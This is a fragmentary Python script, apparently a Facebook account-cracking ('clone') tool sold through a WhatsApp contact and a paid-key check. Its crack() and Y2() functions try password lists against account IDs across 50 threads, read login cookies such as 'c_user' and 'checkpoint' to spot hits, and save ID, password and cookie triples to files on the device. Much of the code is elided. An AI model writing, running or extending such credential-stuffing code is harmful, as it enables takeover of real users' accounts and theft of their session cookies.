...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[NASIM-XD')
...
\033[1;32m  AUTHOR    : MD NASIM MIA

\033[1;32m  GITHUB    : Nasimblog

\033[1;32m  FACEBOOK  : MD Nasim Mia
...
#NASIM_NAME=input(f'\033[1;92m[\033[1;31m\033[1;92m]\033[0;92m YOUR NAME :\x1b[1;96m ')
...
def menu():
	...
	_NASIM_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')

	_NASIM_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')

	_NASIM_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')

	_NASIM_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')

	_NASIM_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')

	_____NASIM_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
...
def passwrd():
	...
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(NASIM_NAME))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [NASIM] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\x1b[1;91m [\033[1;91mNASIM-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')

				#open('/sdcard/'+NASIM-file clone,'a').write(idf+'|'+pw+'\n')
				...
				print(f'\r\x1b[1;92m [\033[1;92mNASIM-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')

				#print('\r\x1b[1;96m [\033[1;93mCOOKIES\033[1;96m]\033[1;91m= \033[1;97m '+kuki+'')

				cek_apk(session,coki)

				open('/sdcard/NASIM-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
...
def Y2():
    ...
    with ThreadPool(max_workers=50) as NASIM:
    ...
    try:
        ...
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	   ...
        	   # print('\033[1;96m[NASIM.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))

              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')

                #cek_apk(session,coki)

        	    open('/sdcard/NASIM-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801886653082?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20NASIM%20Paid%20Tools.%20My%20Key:%20'+key1)

        mex()

    r = requests.get('https://raw.githubusercontent.com/Nasimblog/f-5/main/Approval.txt').text
